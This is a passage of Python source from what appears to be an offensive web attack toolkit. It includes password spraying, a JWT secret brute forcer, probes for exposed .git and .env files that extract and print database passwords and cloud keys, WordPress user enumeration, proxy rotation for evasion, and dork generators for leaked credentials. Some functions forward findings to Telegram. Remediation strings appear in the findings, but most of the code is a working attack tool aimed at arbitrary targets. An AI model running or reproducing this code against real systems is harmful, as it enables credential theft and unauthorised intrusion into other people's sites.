                    if r.status_code == 429:
                        _warn("Rate limit hit — sleeping 30s")
                        time.sleep(30)
                except Exception:
                    pass
        time.sleep(3)
        if idx % 5 == 0:
            _info(f"Sprayed {idx+1}/{len(users)} accounts...")

    if hits:
        _found_box("PASSWORD SPRAY", base,
                   "\n".join(f"{h['username']}:{h['password']}" for h in hits[:5]),
                   found=True)
    else:
        _clean("No valid credentials found")
        _found_box("PASSWORD SPRAY", base, "No hits", found=False)

    _result_box("PASSWORD SPRAY",[
        f"{RED}[HIT]{RST} {h['username']}:{h['password']}"
        for h in hits[:15]
    ] or [f"{GRN}No valid credentials found{RST}"])
    _pause()
    return hits


                                                                                 
                    
                                                                                 

def login_form_detect(sess, base, timeout=None):
    if timeout is None:
        timeout = TIMEOUT
    forms = []
    login_paths = [
        "/", "/login", "/signin", "/sign-in", "/auth",
        "/auth/login", "/account/login", "/user/login",
        "/users/sign_in", "/member/login", "/portal/login",
        "/wp-login.php", "/admin", "/admin/login",
        "/panel/login", "/cp/login", "/api/v1/auth",
    ]
    login_re = re.compile(
        r'<form[^>]*(?:action|method)[^>]*>.*?</form>',
        re.I | re.S
    )
    input_re = re.compile(
        r'<input[^>]+name=["\']([^"\']+)["\'][^>]*(?:type=["\']([^"\']+)["\'])?',
        re.I
    )
    for path in login_paths:
        try:
            r = sess.get(base + path, timeout=timeout, verify=VERIFY_SSL)
            if not r or r.status_code not in (200, 301, 302):
                continue
            body = r.text
            for form_html in login_re.findall(body)[:5]:
                inputs = input_re.findall(form_html)
                field_names = [i[0] for i in inputs]
                has_pass = any(
                    f.lower() in LOGIN_FORM_FIELDS["password_fields"]
                    or "pass" in f.lower()
                    for f in field_names
                )
                has_user = any(
                    f.lower() in LOGIN_FORM_FIELDS["username_fields"]
                    or "user" in f.lower() or "email" in f.lower()
                    for f in field_names
                )
                if has_pass and has_user:
                    action = re.search(r'action=["\']([^"\']+)["\']',
                                       form_html, re.I)
                    action_url = action.group(1) if action else path
                    forms.append({
                        "path":    base + path,
                        "action":  action_url,
                        "fields":  field_names,
                    })
        except Exception:
            pass
    return forms


def login_form_scan(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base  = normalize_base(url)
    sess  = _make_session()
    _info(f"Login Form Detect → {base}")
    forms = login_form_detect(sess, base, TIMEOUT)
    if forms:
        _found_box("LOGIN FORMS", base,
                   "\n".join(f["path"] for f in forms[:5]), found=True)
        _result_box("LOGIN FORMS FOUND",[
            f"{GRN}[FORM]{RST} {f['path'][:50]}"
            f"  {DIM}fields: {', '.join(f['fields'][:5])}{RST}"
            for f in forms[:15]
        ])
    else:
        _clean("No login forms found")
        _found_box("LOGIN FORMS", base, "No login forms", found=False)
    _pause()
    return forms


                                                                                 
                       
                                                                                 

def cookie_entropy_check(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base    = normalize_base(url)
    _info(f"Cookie Entropy Check → {base}")
    results = []

    def _entropy(s):
        import math
        if not s:
            return 0.0
        freq = {}
        for c in s:
            freq[c] = freq.get(c, 0) + 1
        return -sum((f/len(s)) * math.log2(f/len(s))
                    for f in freq.values())

    sessions = []
    for _ in range(5):
        try:
            r = _get(base + "/", timeout=TIMEOUT)
            if r:
                sessions.append({k: v for k, v in r.cookies.items()})
        except Exception:
            pass
        time.sleep(0.3)

    if not sessions:
        _warn("No cookies set by server")
        _pause()
        return []

    all_cookie_names = set()
    for s in sessions:
        all_cookie_names.update(s.keys())

    for name in all_cookie_names:
        values = [s[name] for s in sessions if name in s]
        if not values:
            continue
        entropies  = [_entropy(v) for v in values]
        avg_ent    = sum(entropies) / len(entropies)
        avg_len    = sum(len(v) for v in values) / len(values)
        predictable = avg_ent < 3.0 or avg_len < 8

        if predictable:
            _vuln(f"Low entropy cookie: {name}  "
                  f"avg_entropy={avg_ent:.2f}  avg_len={avg_len:.0f}")
            results.append({
                "name":    name,
                "entropy": round(avg_ent, 2),
                "length":  round(avg_len, 0),
                "values":  values[:3],
                "issue":   "low_entropy",
            })
            _add_finding(
                "MEDIUM","Low Entropy Session Cookie",base,
                f"Cookie '{name}' has low entropy ({avg_ent:.2f} bits) — predictable",
                f"Sample values: {', '.join(values[:2])}",
                "Use cryptographically random session tokens (min 128 bits).",
                "Session Security"
            )
        else:
            _found(f"Cookie {name}: entropy={avg_ent:.2f}  len={avg_len:.0f}  OK")

        if len(values) >= 2 and values[0] == values[1]:
            _vuln(f"Static cookie: {name} = {values[0][:30]}")
            results.append({
                "name":  name,
                "issue": "static_value",
                "value": values[0],
            })
            _add_finding(
                "HIGH","Static Session Cookie",base,
                f"Cookie '{name}' has identical value across requests",
                f"Value: {values[0][:40]}",
                "Regenerate session tokens on each request/login.",
                "Session Security"
            )

    if results:
        _found_box("COOKIE ISSUES", base,
                   "\n".join(r['name'] for r in results[:5]), found=True)
    else:
        _clean("Cookie entropy looks fine")
        _found_box("COOKIE ENTROPY", base, "Cookies look fine", found=False)

    _result_box("COOKIE ENTROPY",[
        f"{RED}[{r['issue'].upper()}]{RST} {r['name']}"
        + (f"  entropy={r['entropy']}" if 'entropy' in r else "")
        for r in results[:15]
    ] or [f"{GRN}No cookie entropy issues{RST}"])
    _pause()
    return results


                                                                                 
                        
                                                                                 

def jwt_weak_brute(target=None):
    _banner()
    _info("JWT Weak Secret Bruteforcer")
    token = _ask("paste JWT token").strip()
    if not token:
        _pause()
        return None
    try:
        import base64 as b64
        parts = token.split(".")
        if len(parts) != 3:
            _err("Invalid JWT format")
            _pause()
            return None
        header_b64  = parts[0]
        payload_b64 = parts[1]
        sig_b64     = parts[2]

        header_b64 += "=" * (-len(header_b64) % 4)
        header = json.loads(b64.b64decode(header_b64).decode("utf-8","ignore"))
        alg    = header.get("alg","?")
        _info(f"Algorithm: {alg}")

        payload_b64 += "=" * (-len(payload_b64) % 4)
        payload = json.loads(b64.b64decode(payload_b64).decode("utf-8","ignore"))
        _info(f"Payload: {json.dumps(payload, indent=2)[:200]}")

        if alg.upper() in JWT_ALG_NONE_VARIANTS or alg.upper() == "NONE":
            _vuln("JWT uses alg:none — signature is not verified!")
            _add_finding(
                "CRITICAL","JWT Algorithm None",target or "manual",
                "JWT signed with alg:none — not verified",
                token[:100],
                "Reject tokens with alg:none on server side.","JWT"
            )
            _pause()
            return {"vulnerability": "alg_none", "token": token}

        if alg.upper().startswith("HS"):
            import hmac as _hmac_lib
            import hashlib as _hl

            hash_map = {
                "HS256": _hl.sha256,
                "HS384": _hl.sha384,
                "HS512": _hl.sha512,
            }
            hash_fn = hash_map.get(alg.upper(), _hl.sha256)
            msg     = f"{parts[0]}.{parts[1]}".encode()

            pad_len = len(sig_b64) % 4
            if pad_len:
                sig_b64 += "=" * (4 - pad_len)
            try:
                expected_sig = b64.urlsafe_b64decode(sig_b64)
            except Exception:
                _err("Could not decode signature")
                _pause()
                return None

            _info(f"Bruting {len(JWT_WEAK_SECRETS_LIST)} common secrets...")
            cracked = None
            for secret in JWT_WEAK_SECRETS_LIST:
                mac = _hmac_lib.new(
                    secret.encode(), msg, hash_fn
                ).digest()
                if mac == expected_sig:
                    cracked = secret
                    break

            if cracked:
                _vuln(f"JWT secret cracked: {cracked}")
                _add_finding(
                    "CRITICAL","JWT Weak Secret",target or "manual",
                    f"JWT signed with weak/common secret: {cracked}",
                    token[:100],
                    "Use a cryptographically random secret (32+ bytes).","JWT"
                )
                _result_box("JWT CRACKED",[
                    f"{RED}Secret:{RST} {cracked}",
                    f"{CYN}Algorithm:{RST} {alg}",
                    f"{DIM}Payload:{RST} {str(payload)[:80]}",
                ])
                _pause()
                return {"secret": cracked, "alg": alg, "payload": payload}
            else:
                _clean("Secret not found in built-in wordlist")
                custom = _ask("custom wordlist file [blank=skip]").strip()
                if custom and os.path.exists(custom):
                    with open(custom, "r", errors="ignore") as fh:
                        for line in fh:
                            secret = line.strip()
                            if not secret:
                                continue
                            mac = _hmac_lib.new(
                                secret.encode(), msg, hash_fn
                            ).digest()
                            if mac == expected_sig:
                                cracked = secret
                                break
                if cracked:
                    _vuln(f"JWT secret cracked (custom): {cracked}")
                else:
                    _clean("JWT secret not found")
        else:
            _warn(f"Algorithm {alg} — need RSA/EC public key for verification")

    except Exception as e:
        _err(f"JWT brute error: {e}")
    _pause()
    return None


                                                                                 
                  
                                                                                 

def git_dump_check(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base    = normalize_base(url)
    _info(f"Git Exposure Check → {base}")
    results = []
    git_key_paths = [
        "/.git/HEAD", "/.git/config", "/.git/index",
        "/.git/COMMIT_EDITMSG", "/.git/FETCH_HEAD",
        "/.git/logs/HEAD", "/.git/refs/heads/master",
        "/.git/refs/heads/main", "/.git/packed-refs",
        "/.git/description", "/.git/info/exclude",
        "/.git/refs/remotes/origin/HEAD",
        "/.gitignore", "/.gitmodules",
        "/.svn/entries", "/.svn/wc.db",
        "/.hg/manifest", "/.hg/store/",
        "/.bzr/branch-format", "/.bzr/README",
    ]

    for path in git_key_paths:
        full = base + path
        try:
            r = _get(full, timeout=TIMEOUT)
            if not r:
                continue
            if r.status_code == 200 and len(r.content) > 10:
                content = r.text[:500]
                is_interesting = (
                    "ref: refs/" in content
                    or "repositoryformatversion" in content
                    or "commit" in content.lower()
                    or "filemode" in content
                    or "HEAD" in content
                    or "svn" in content.lower()
                    or "hg" in content.lower()
                )
                if is_interesting:
                    _vuln(f"Git exposed: {full}  [{r.status_code}]")
                    results.append({
                        "path":    full,
                        "status":  r.status_code,
                        "size":    len(r.content),
                        "preview": content[:100],
                    })
                    _add_finding(
                        "CRITICAL","Git Repository Exposed",full,
                        "Source code / VCS metadata accessible via HTTP",
                        f"Path: {path}  Preview: {content[:60]}",
                        "Block /.git, /.svn, /.hg access in server config.",
                        "Source Exposure"
                    )
                else:
                    _colored_hit(full, r.status_code, len(r.content))
        except Exception:
            pass
        _jitter()

    if results:
        full_git = base + "/.git"
        try:
            r_idx = _get(full_git + "/", timeout=TIMEOUT)
            if r_idx and "Index of" in (r_idx.text or ""):
                _vuln("Directory listing on /.git/ — full dump possible!")
        except Exception:
            pass
        detail = "\n".join(r["path"] for r in results[:5])
        _found_box("GIT EXPOSED", base, detail, found=True)
    else:
        _clean("No git/VCS exposure found")
        _found_box("GIT EXPOSED", base, "No VCS exposure", found=False)

    _result_box("GIT DUMP CHECK",[
        f"{RED}[EXPOSED]{RST} {r['path'][:60]}"
        f"  {DIM}size:{r['size']}b{RST}"
        for r in results[:15]
    ] or [f"{GRN}No VCS files exposed{RST}"])
    _tg_send_result("GIT EXPOSED", base,
                    "\n".join(r["path"] for r in results[:5]),
                    CURRENT_USER) if results else None
    _pause()
    return results


                                                                                 
                                  
                                                                                 

def env_file_check(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base    = normalize_base(url)
    _info(f"Env File Check → {base}")
    results = []

    env_paths = [
        "/.env", "/.env.bak", "/.env.backup", "/.env.old",
        "/.env.save", "/.env.local", "/.env.production",
        "/.env.staging", "/.env.dev", "/.env.development",
        "/.env.example", "/.env.sample", "/.env~",
        "/.env.copy", "/.env.new", "/.env2", "/.env3",
        "/.env.orig", "/.env.bkp", "/.env_backup",
        "/config.env", "/app.env", "/server.env",
        "/backend/.env", "/api/.env", "/app/.env",
        "/frontend/.env", "/web/.env",
        "/src/.env", "/public/.env",
        "/.env.production.local", "/.env.development.local",
        "/site/.env", "/www/.env",
        "/.env.test", "/.env.testing", "/.env.ci",
        "/.env.uat", "/.env.qa",
    ]

    for path in env_paths:
        full = base + path
        try:
            r = _get(full, timeout=TIMEOUT)
            if not r or r.status_code != 200:
                continue
            content = r.text
            if len(content) < 5:
                continue
            env_sigs = ["=", "DB_", "APP_", "DATABASE", "SECRET",
                        "PASSWORD", "KEY", "TOKEN", "URL", "HOST",
                        "MAIL_", "REDIS_", "AWS_", "STRIPE_", "GOOGLE_"]
            if not any(s in content for s in env_sigs):
                continue
            _vuln(f"Env file exposed: {full}")
            _colored_hit(full, r.status_code, len(r.content))
            extracted = {}
            for line in content.split("\n"):
                line = line.strip()
                if not line or line.startswith("#") or "=" not in line:
                    continue
                k, _, v = line.partition("=")
                k = k.strip()
                v = v.strip().strip('"').strip("'")
                if v and len(v) > 2:
                    extracted[k] = v
                    high_value_keys = [
                        "DB_PASSWORD","DATABASE_URL","DB_URL",
                        "SECRET_KEY","APP_KEY","JWT_SECRET",
                        "STRIPE_SECRET_KEY","STRIPE_LIVE",
                        "AWS_SECRET_ACCESS_KEY","AWS_ACCESS_KEY_ID",
                        "MAIL_PASSWORD","SMTP_PASSWORD",
                        "REDIS_PASSWORD","REDIS_URL",
                        "SENDGRID_API_KEY","MAILGUN_API_KEY",
                        "TWILIO_AUTH_TOKEN","GITHUB_TOKEN",
                        "PRIVATE_KEY","ENCRYPTION_KEY",
                        "ADMIN_PASSWORD","ROOT_PASSWORD",
                        "MASTER_KEY","SIGNING_KEY",
                    ]
                    if k in high_value_keys:
                        _vuln(f"  {k} = {v[:60]}")
                        _add_finding(
                            "CRITICAL",f"Sensitive Key in .env — {k}",full,
                            f"Found {k} in exposed env file",
                            f"{k}={v[:60]}",
                            "Never expose .env files. Add to .gitignore. Rotate keys.",
                            "Secrets Exposure"
                        )
            results.append({
                "path":      full,
                "status":    r.status_code,
                "keys_found": list(extracted.keys()),
                "content":   content[:500],
            })
            _add_finding(
                "CRITICAL","Env File Exposed",full,
                f"Found {len(extracted)} environment variables",
                "\n".join(f"{k}=***" for k in list(extracted.keys())[:10]),
                "Block .env access in server config. Use secrets manager.",
                "Secrets Exposure"
            )
        except Exception:
            pass
        _jitter()

    if results:
        detail = "\n".join(r["path"] for r in results[:5])
        _found_box("ENV EXPOSED", base, detail, found=True)
        _tg_send_result("ENV FILE EXPOSED", base, detail, CURRENT_USER)
    else:
        _clean("No env files exposed")
        _found_box("ENV FILES", base, "No env files exposed", found=False)

    _result_box("ENV FILE CHECK",[
        f"{RED}[EXPOSED]{RST} {r['path']}"
        f"  {DIM}keys: {len(r['keys_found'])}{RST}"
        for r in results[:15]
    ] or [f"{GRN}No env files found{RST}"])
    _pause()
    return results


                                                                                 
                                
                                                                                 

def html_comment_scan(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base    = normalize_base(url)
    _info(f"HTML Comment Scanner → {base}")
    results = []
    comment_re = re.compile(r'<!--(.*?)-->', re.S)
    sensitive_kw = [
        "password","passwd","pass","pwd","secret","key","token",
        "api","admin","user","username","email","login","auth",
        "database","db","mysql","postgres","mongo","redis",
        "private","internal","debug","test","todo","fixme",
        "hack","backdoor","bypass","remove","old","temp",
        "disabled","commented","note","version","config",
        "aws","azure","gcp","s3","bucket",
        "stripe","paypal","paymentkey","creditcard",
        "ssh","ssl","tls","cert","certificate",
    ]
    pages_to_scan = ["/", "/login", "/admin", "/register", "/contact",
                     "/about", "/index.php", "/index.html", "/home"]

    for page in pages_to_scan:
        full = base + page
        try:
            r = _get(full, timeout=TIMEOUT)
            if not r or r.status_code not in (200, 301, 302):
                continue
            comments = comment_re.findall(r.text)
            for comment in comments:
                comment_clean = comment.strip()
                if len(comment_clean) < 3:
                    continue
                low = comment_clean.lower()
                matches = [kw for kw in sensitive_kw if kw in low]
                if matches:
                    _vuln(f"Sensitive comment [{', '.join(matches[:3])}]"
                          f"  in {full}: {comment_clean[:80]}")
                    results.append({
                        "page":     full,
                        "comment":  comment_clean[:200],
                        "keywords": matches,
                    })
                    _add_finding(
                        "MEDIUM","Sensitive HTML Comment",full,
                        f"Comment contains sensitive keywords: {', '.join(matches[:5])}",
                        comment_clean[:100],
                        "Remove all developer comments from production HTML.",
                        "Information Disclosure"
                    )
                elif len(comment_clean) > 50:
                    _log("verbose", f"Comment: {comment_clean[:60]}")
        except Exception:
            pass

    if results:
        detail = "\n".join(
            f"[{', '.join(r['keywords'][:2])}] {r['comment'][:50]}"
            for r in results[:5]
        )
        _found_box("HTML COMMENTS", base, detail, found=True)
    else:
        _clean("No sensitive comments found")
        _found_box("HTML COMMENTS", base, "No sensitive comments", found=False)

    _result_box("COMMENT SCAN",[
        f"{YLW}[{', '.join(r['keywords'][:2]).upper()}]{RST}"
        f" {r['page']:<40} {DIM}{r['comment'][:40]}{RST}"
        for r in results[:15]
    ] or [f"{GRN}No sensitive comments{RST}"])
    _pause()
    return results


                                                                                 
                                
                                                                                 

def wp_plugin_readme_enum(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base    = normalize_base(url)
    _info(f"WP Plugin README Version Enum → {base}")
    results = []
    ver_re  = re.compile(r'(?:Stable tag|Version)\s*:\s*([\d.]+)', re.I)

    for plugin in WP_PLUGINS_TOP:
        for readme_path in [
            f"/wp-content/plugins/{plugin}/readme.txt",
            f"/wp-content/plugins/{plugin}/README.txt",
            f"/wp-content/plugins/{plugin}/readme.md",
            f"/wp-content/plugins/{plugin}/README.md",
        ]:
            full = base + readme_path
            try:
                r = _get(full, timeout=TIMEOUT)
                if not r or r.status_code != 200:
                    continue
                content = r.text
                if len(content) < 20:
                    continue
                m = ver_re.search(content)
                ver = m.group(1) if m else "unknown"
                _found(f"Plugin: {plugin:<35} ver: {ver}")
                _colored_hit(full, r.status_code, len(r.content), f"plugin:{plugin} v{ver}")
                results.append({
                    "plugin":  plugin,
                    "version": ver,
                    "url":     full,
                })
                _add_finding(
                    "INFO",f"WP Plugin Detected: {plugin}",full,
                    f"Plugin {plugin} version {ver} is installed",
                    f"readme.txt accessible: {full}",
                    "Keep plugins updated. Remove unused plugins.",
                    "WordPress"
                )
                break
            except Exception:
                pass
        _jitter()

    if results:
        _found_box("WP PLUGINS", base,
                   "\n".join(f"{r['plugin']} v{r['version']}" for r in results[:10]),
                   found=True)
    else:
        _clean("No plugin readme files found")
        _found_box("WP PLUGINS", base, "No plugin readmes accessible", found=False)

    _result_box("PLUGIN VERSION ENUM",[
        f"{GRN}{r['plugin']:<35}{RST}  v{r['version']}"
        for r in results[:30]
    ] or [f"{DIM}No readable plugin readmes{RST}"])
    _pause()
    return results


                                                                                 
                                   
                                                                                 

def wp_user_author_enum(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base    = normalize_base(url)
    _info(f"WP User Enum (author redirect) → {base}")
    users   = []
    max_ids = 30
    slug_re = re.compile(
        r'location:\s*' + re.escape(base) + r'/author/([^/\s]+)',
        re.I
    )
    for uid in range(1, max_ids + 1):
        try:
            r = _sess().get(
                f"{base}/?author={uid}",
                timeout=TIMEOUT,
                verify=VERIFY_SSL,
                allow_redirects=False,
            )
            if not r:
                continue
            if r.status_code in (301, 302, 303):
                loc = r.headers.get("Location","")
                m   = re.search(r'/author/([^/?#]+)', loc, re.I)
                if m:
                    slug = m.group(1).strip("/")
                    if slug and slug not in [u["slug"] for u in users]:
                        users.append({"id": uid, "slug": slug, "url": loc})
                        _vuln(f"WP User: id={uid}  slug={slug}")
                        _add_finding(
                            "MEDIUM","WordPress User Enumerated",base,
                            f"User id={uid} → slug={slug}",
                            f"/?author={uid} → {loc}",
                            "Disable author archives or block /?author= requests.",
                            "WordPress"
                        )
            elif r.status_code == 200:
                m = re.search(
                    r'class="author [^"]*">([^<]+)<',
                    r.text, re.I
                )
                if m:
                    name = m.group(1).strip()
                    users.append({"id": uid, "slug": name, "url": f"/?author={uid}"})
                    _vuln(f"WP User: id={uid}  name={name}")
        except Exception:
            pass
        _jitter()

    if users:
        detail = "\n".join(f"id={u['id']}  slug={u['slug']}" for u in users[:10])
        _found_box("WP USERS", base, detail, found=True)
        _tg_send_result("WP USER ENUM", base, detail, CURRENT_USER)
    else:
        _clean("No WP users enumerated via author redirect")
        _found_box("WP USERS", base, "No users found", found=False)

    _result_box("WP USER ENUM",[
        f"{RED}id={u['id']}{RST}  slug={u['slug']}"
        for u in users[:30]
    ] or [f"{GRN}No users enumerated{RST}"])
    _pause()
    return users


                                                                                 
                                      
                                                                                 

def retry_get(url, max_retries=3, base_delay=1.0, **kw):
    last_err = None
    for attempt in range(max_retries):
        try:
            kw.setdefault("timeout",         TIMEOUT)
            kw.setdefault("verify",          VERIFY_SSL)
            kw.setdefault("allow_redirects", True)
            r = _sess().get(url, **kw)
            if r is not None:
                if r.status_code in RATE_LIMIT_CODES:
                    delay = base_delay * (2 ** attempt) + random.uniform(0, 1)
                    _warn(f"Rate limited ({r.status_code}) — retry {attempt+1}/{max_retries}"
                          f" in {delay:.1f}s")
                    time.sleep(delay)
                    continue
                return r
        except Exception as e:
            last_err = e
            delay = base_delay * (2 ** attempt) + random.uniform(0, 0.5)
            time.sleep(delay)
    if last_err:
        _log("debug", f"retry_get failed after {max_retries}: {last_err}")
    return None


def retry_post(url, max_retries=3, base_delay=1.0, **kw):
    last_err = None
    for attempt in range(max_retries):
        try:
            kw.setdefault("timeout", TIMEOUT)
            kw.setdefault("verify",  VERIFY_SSL)
            r = _sess().post(url, **kw)
            if r is not None:
                if r.status_code in RATE_LIMIT_CODES:
                    delay = base_delay * (2 ** attempt) + random.uniform(0, 1)
                    _warn(f"Rate limited ({r.status_code}) — retry {attempt+1}/{max_retries}"
                          f" in {delay:.1f}s")
                    time.sleep(delay)
                    continue
                return r
        except Exception as e:
            last_err = e
            delay = base_delay * (2 ** attempt) + random.uniform(0, 0.5)
            time.sleep(delay)
    if last_err:
        _log("debug", f"retry_post failed after {max_retries}: {last_err}")
    return None


                                                                                 
                 
                                                                                 

_proxy_pool      = []
_proxy_index_cur = [0]


def load_proxy_list(filepath=None):
    global _proxy_pool
    if filepath and os.path.exists(filepath):
        with open(filepath, "r", errors="ignore") as fh:
            proxies = [l.strip() for l in fh if l.strip()]
    else:
        proxies = list(PROXY_LIST_BUILTIN)
    _proxy_pool = [p if p.startswith("http") else f"http://{p}"
                   for p in proxies]
    _info(f"Loaded {len(_proxy_pool)} proxies")
    return _proxy_pool


def _next_proxy():
    if not _proxy_pool:
        return None
    idx = _proxy_index_cur[0] % len(_proxy_pool)
    _proxy_index_cur[0] += 1
    return _proxy_pool[idx]


def proxy_rotate_get(url, **kw):
    proxy = _next_proxy()
    if not proxy:
        return _get(url, **kw)
    try:
        kw.setdefault("timeout",         TIMEOUT)
        kw.setdefault("verify",          VERIFY_SSL)
        kw.setdefault("allow_redirects", True)
        r = requests.get(url, proxies={"http": proxy,"https": proxy}, **kw)
        return r
    except Exception:
        _proxy_pool.remove(proxy) if proxy in _proxy_pool else None
        return _get(url, **kw)


def proxy_menu():
    _banner()
    _menu_box("PROXY MANAGER",[
        "[1] Load proxy list from file",
        "[2] Show loaded proxies",
        "[3] Test proxies",
        "[4] Clear proxy list",
        "[00] Back",
    ])
    ch = _ask("proxy-option").strip()
    if ch == "1":
        path = _ask("proxy-file path").strip()
        load_proxy_list(path)
        _pause()
    elif ch == "2":
        if _proxy_pool:
            _result_box("PROXIES",[f"{GRN}{p}{RST}" for p in _proxy_pool[:30]])
        else:
            _warn("No proxies loaded")
        _pause()
    elif ch == "3":
        if not _proxy_pool:
            _warn("Load proxies first")
            _pause()
            return
        _info("Testing proxies...")
        working = []
        for proxy in _proxy_pool[:20]:
            try:
                r = requests.get(
                    "https://api.ipify.org?format=json",
                    proxies={"http": proxy,"https": proxy},
                    timeout=8, verify=False,
                )
                if r and r.ok:
                    data = r.json()
                    _found(f"[OK] {proxy}  →  IP: {data.get('ip','?')}")
                    working.append(proxy)
                else:
                    _warn(f"[FAIL] {proxy}")
            except Exception:
                _warn(f"[DEAD] {proxy}")
        _proxy_pool.clear()
        _proxy_pool.extend(working)
        _info(f"Working proxies: {len(working)}")
        _pause()
    elif ch == "4":
        _proxy_pool.clear()
        _clean("Proxy list cleared")
        _pause()


                                                                                 
                    
                                                                                 

_throttle_state = {"delay": 0.0, "rate_limit_hits": 0}


def adaptive_get(url, **kw):
    if _throttle_state["delay"] > 0:
        time.sleep(_throttle_state["delay"])
    r = retry_get(url, **kw)
    if r is not None and r.status_code in RATE_LIMIT_CODES:
        _throttle_state["rate_limit_hits"] += 1
        _throttle_state["delay"] = min(
            _throttle_state["delay"] + 0.5,
            5.0
        )
        _warn(f"Adaptive throttle: delay={_throttle_state['delay']:.1f}s"
              f"  rate_limit_hits={_throttle_state['rate_limit_hits']}")
        retry_after = r.headers.get("Retry-After","")
        if retry_after:
            try:
                time.sleep(float(retry_after))
            except Exception:
                time.sleep(5)
        else:
            time.sleep(_throttle_state["delay"] * 2)
    elif r is not None and r.status_code < 400:
        _throttle_state["delay"] = max(0.0, _throttle_state["delay"] - 0.1)
    return r


def reset_throttle():
    _throttle_state["delay"]            = 0.0
    _throttle_state["rate_limit_hits"]  = 0


                                                                                 
                                                     
                                                                                 

def shodan_dork_gen(target):
    _banner()
    if not target:
        target = _ask("target domain / IP").strip()
    if not target:
        return
    parsed = urlparse(normalize(target))
    host   = parsed.hostname or target
    ip     = None
    try:
        ip = socket.gethostbyname(host)
    except Exception:
        pass

    dorks = [
        f"https://www.shodan.io/search?query=hostname%3A{host}",
        f"https://www.shodan.io/search?query=ssl%3A{host}",
        f"https://www.shodan.io/search?query=http.title%3A{host}",
        f"https://www.shodan.io/search?query=http.html%3A{host}",
        f"https://www.shodan.io/search?query=http.component%3A{host}",
        f"https://www.shodan.io/search?query=org%3A{host}",
        f"https://www.shodan.io/search?query=domain%3A{host}",
    ]
    if ip:
        dorks += [
            f"https://www.shodan.io/host/{ip}",
            f"https://www.shodan.io/search?query=ip%3A{ip}",
        ]
    dorks += [
        f"https://search.censys.io/search?resource=hosts&q={host}",
        f"https://search.censys.io/search?resource=certificates&q=parsed.names%3A{host}",
        f"https://fofa.info/result?qbase64={__import__('base64').b64encode(f'host={host}'.encode()).decode()}",
        f"https://app.binaryedge.io/services/query?query=hostname%3A{host}",
        f"https://www.zoomeye.org/searchResult?q={host}",
        f"https://hunter.how/search?query={host}",
    ]

    _result_box("SHODAN / OSINT DORKS",[f"{CYN}{d}{RST}" for d in dorks])
    _pause()
    return dorks


def google_dork_gen(target):
    _banner()
    if not target:
        target = _ask("target domain").strip()
    if not target:
        return
    parsed = urlparse(normalize(target))
    domain = parsed.hostname or target
    parts  = domain.split(".")
    root   = ".".join(parts[-2:]) if len(parts) >= 2 else domain

    dorks = [
        f'https://www.google.com/search?q=site%3A{root}+intitle%3Aadmin',
        f'https://www.google.com/search?q=site%3A{root}+inurl%3Aadmin',
        f'https://www.google.com/search?q=site%3A{root}+inurl%3Alogin',
        f'https://www.google.com/search?q=site%3A{root}+inurl%3Aphp',
        f'https://www.google.com/search?q=site%3A{root}+ext%3Asql',
        f'https://www.google.com/search?q=site%3A{root}+ext%3Atxt+password',
        f'https://www.google.com/search?q=site%3A{root}+ext%3Aenv',
        f'https://www.google.com/search?q=site%3A{root}+ext%3Abak',
        f'https://www.google.com/search?q=site%3A{root}+ext%3Axml',
        f'https://www.google.com/search?q=site%3A{root}+ext%3Ajson',
        f'https://www.google.com/search?q=site%3A{root}+ext%3Aconfig',
        f'https://www.google.com/search?q=site%3A{root}+ext%3Aconf',
        f'https://www.google.com/search?q=site%3A{root}+ext%3Alog',
        f'https://www.google.com/search?q=site%3A{root}+ext%3Axlsx+password',
        f'https://www.google.com/search?q=site%3A{root}+intext%3Apassword',
        f'https://www.google.com/search?q=site%3A{root}+intext%3A"api_key"',
        f'https://www.google.com/search?q=site%3A{root}+intext%3A"secret_key"',
        f'https://www.google.com/search?q=site%3A{root}+intext%3AAKA',
        f'https://www.google.com/search?q=site%3A{root}+intext%3A"database_url"',
        f'https://www.google.com/search?q=site%3A{root}+intext%3A"DB_PASSWORD"',
        f'https://www.google.com/search?q=site%3A{root}+intitle%3A"phpMyAdmin"',
        f'https://www.google.com/search?q=site%3A{root}+intitle%3A"Index+of"',
        f'https://www.google.com/search?q=site%3A{root}+intitle%3A"WP+Admin"',
        f'https://www.google.com/search?q=site%3A{root}+intitle%3A"503+Service"',
        f'https://www.google.com/search?q=site%3A{root}+intitle%3A"404+Not+Found"',
        f'https://www.google.com/search?q=site%3A{root}+intitle%3A"Login+Page"',
        f'https://www.google.com/search?q=site%3A{root}+inurl%3Aswagger',
        f'https://www.google.com/search?q=site%3A{root}+inurl%3Agraphql',
        f'https://www.google.com/search?q=site%3A{root}+inurl%3Aapi-docs',
        f'https://www.google.com/search?q=site%3A{root}+inurl%3Awp-content+uploads',
        f'https://www.google.com/search?q=site%3A{root}+inurl%3Awp-login',
        f'https://www.google.com/search?q="{root}"+filetype%3Asql',
        f'https://www.google.com/search?q="{root}"+filetype%3Atxt+password',
        f'https://www.google.com/search?q="{root}"+filetype%3Aenv',
        f'https://www.google.com/search?q=inurl%3Apastebin.com+"{root}"',
        f'https://www.google.com/search?q=inurl%3Agithub.com+"{root}"+password',
        f'https://www.google.com/search?q=inurl%3Agithub.com+"{root}"+api_key',
        f'https://www.google.com/search?q=inurl%3Agithub.com+"{root}"+secret',
        f'https://www.google.com/search?q=site%3Alinkedin.com+"{root}"',
        f'https://www.google.com/search?q=site%3Atrello.com+"{root}"',
        f'https://www.google.com/search?q=site%3Ajira.{root}',
        f'https://www.google.com/search?q=site%3Aconfluence.{root}',
    ]

    _result_box("GOOGLE DORKS",[f"{CYN}{d[:90]}{RST}" for d in dorks])
    _pause()
    return dorks


def leak_search_gen(target):
    _banner()
    if not target:
        target = _ask("target domain").strip()
    if not target:
        return
    parsed = urlparse(normalize(target))
    domain = parsed.hostname or target
    parts  = domain.split(".")
    root   = ".".join(parts[-2:]) if len(parts) >= 2 else domain

    links = [
        f"https://github.com/search?q={root}+password&type=code",
        f"https://github.com/search?q={root}+api_key&type=code",
        f"https://github.com/search?q={root}+secret&type=code",
